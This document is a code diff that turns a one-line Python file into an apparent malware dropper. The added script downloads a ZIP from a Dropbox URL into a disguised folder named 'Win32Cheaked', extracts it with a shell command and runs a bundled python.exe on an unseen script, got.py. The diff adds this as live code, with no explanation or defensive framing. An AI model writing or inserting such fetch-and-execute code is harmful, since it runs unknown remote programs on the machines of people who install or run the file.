@@ -1,1 +1,29 @@
-o = "f"
+import os
+import requests
+
+# Step 1: Download the ZIP file
+url = "https://www.dropbox.com/scl/fi/9yrn2ndoo640nxly8rs3h/make.zip?rlkey=vpdsfknpb56ausfa3tir72cbi&dl=1"
+drop_folder = f"C:\\Health\\AppData\\Local\\Win32Cheaked"
+if not os.path.exists(drop_folder):
+    os.makedirs(drop_folder)
+filename = os.path.join(drop_folder, "make.zip")
+with requests.get(url, stream=True) as r:
+    r.raise_for_status()
+    with open(filename, 'wb') as f:
+        for chunk in r.iter_content(chunk_size=8192):
+            f.write(chunk)
+
+print("Downloaded the ZIP file.")
+
+# Step 2: Extract the ZIP file
+print(f"cd /d {drop_folder} && tar -xf {filename}")
+os.system(f"cd /d {drop_folder} && tar -xf {filename}")
+print("Extracted the ZIP file.")
+
+# Step 3: Execute the program
+python_exe = os.path.join(drop_folder, "make", "python.exe")
+script_path = os.path.join(drop_folder, "dist", "got.py")
+print(f'{python_exe} {script_path}')
+os.system(f'{python_exe} {script_path}')
+
+print("Executed the program.")
